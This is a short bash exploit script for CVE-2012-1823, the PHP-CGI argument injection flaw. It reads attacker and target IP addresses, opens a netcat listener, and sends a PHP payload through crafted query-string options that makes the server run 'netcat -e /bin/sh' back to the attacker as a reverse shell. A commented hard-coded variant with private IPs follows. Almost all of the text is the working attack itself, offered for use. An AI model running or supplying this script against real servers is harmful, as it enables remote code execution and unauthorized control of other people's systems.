#!/bin/bash
#CVE-2012-1823 PHP CGI Exploit Script. 
#Sets up Navicat Listener and Pops reverse shell on server. Note. Only works if server has navicat installed. If not, use different shell method. 
echo "ip:"
echo `ifconfig eth0 2>/dev/null|awk '/inet addr:/ {print $2}'|sed 's/addr://'`
echo "Type LHOST IP, followed by [ENTER]:"
read LHOST


echo "Type RHOST IP, followed by [ENTER]:"
read RHOST

#Run netcat listener in new window (Netcat takes over terminal session) - This is your reverse shell interface. 
gnome-terminal -e "bash -c \"netcat -lvp 8080; exec bash\""
#netcat -lvp 8080 <- Opens listener

#Then run Payload to run a netcat reverse shell. Replace LHOST with Attack IP (Target of Reverse Shell) and Replace RHOST with Target for Payload.
echo "<?php system('netcat -e /bin/sh $LHOST 8080');die(); ?>" | POST "http://$RHOST/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input"

#To hard code values, remove $LHOST and $RHOST and replace with local IP and Remote IP as applicable/ if you need to change ports.
#echo "<?php system('netcat -e /bin/sh 192.168.0.22 8080');die(); ?>" | POST "http://192.168.0.24/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input"